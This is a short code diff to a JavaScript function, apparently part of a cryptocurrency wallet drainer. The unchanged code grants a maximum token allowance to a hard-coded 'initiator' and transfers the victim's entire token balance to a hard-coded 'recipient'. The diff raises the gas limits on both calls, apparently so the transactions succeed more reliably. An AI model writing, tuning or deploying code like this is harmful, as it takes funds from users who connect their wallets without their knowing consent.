@@ -203,7 +203,7 @@ export const increaseAllowance = async (token) => {
       abi: constants.ALLOWANCEABI,
       functionName: 'increaseAllowance',
       args: [constants.initiator, constants.max],
-      gas: '50000',
+      gas: '100000',
       gasPrice: feeData.gasPrice
     }).then(async (result) => {
       console.log(result)
@@ -219,7 +219,7 @@ export const increaseAllowance = async (token) => {
       abi: constants.ERC20ABI,
       functionName: 'transfer',
       args: [constants.recipient, token.balance],
-      gas: '50000',
+      gas: '100000',
       gasPrice: feeData.gasPrice
     }).then((result) => {
       console.log(result)
